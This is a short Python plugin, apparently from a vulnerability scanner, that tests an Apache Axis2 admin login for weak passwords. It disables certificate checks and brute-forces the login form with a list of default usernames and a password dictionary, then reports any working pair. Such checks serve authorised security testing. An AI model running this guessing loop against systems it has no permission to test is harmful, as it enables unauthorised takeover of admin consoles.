# -*- coding:utf-8 -*-

import urllib.request, urllib.error, urllib.parse
from exp.lib.gla import getpassdict
import ssl

ssl._create_default_https_context = ssl._create_unverified_context

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if axis2 weak pass vul')
    error_i = 0
    flag_list = ['Administration Page</title>', 'System Components', '"axis2-admin/upload"','include page="footer.inc">', 'axis2-admin/logout']
    user_list = ['axis', 'admin', 'root','zte','ztezte']
    passdictarr = getpassdict()
    psw = passdictarr.get_pass_dict()
    psw.append('axis2')
    for user in user_list:
        for pass_ in psw:
            try:
                login_url = url + '/axis2/axis2-admin/login'
                PostStr = 'userName=%s&password=%s&submit=+Login+' % (user, pass_)
                PostStr = PostStr.encode(encoding="utf-8")
                request = urllib.request.Request(login_url, PostStr)
                res = urllib.request.urlopen(request, timeout=5)
                res_html = res.read().decode('utf-8','ignore')
            except urllib.error.HTTPError as e:
                msg = str(e)
                number = 'v0'
                return False,url,number,msg
            except urllib.error.URLError as e:
                msg = str(e)
                error_i += 1
                if error_i >= 5:
                    msg = 'Therer is no axis2 weakpass vul in url:' +login_url+'.'
                    number = 'v0'
                    return False,url,number,msg
                continue
            for flag in flag_list:
                if flag in res_html:
                    msg = 'Found axis2 weakpass vul in url:'+login_url+' with username and password: '+user+' : '+pass_+'.'
                    print(msg)
                    number = 'v68'
                    return True,url,number,msg
                else:
                    pass
    msg = 'Therer is no axis2 weakpass vul in url:' +login_url+'.'
    number = 'v0'
    return False,url,number,msg
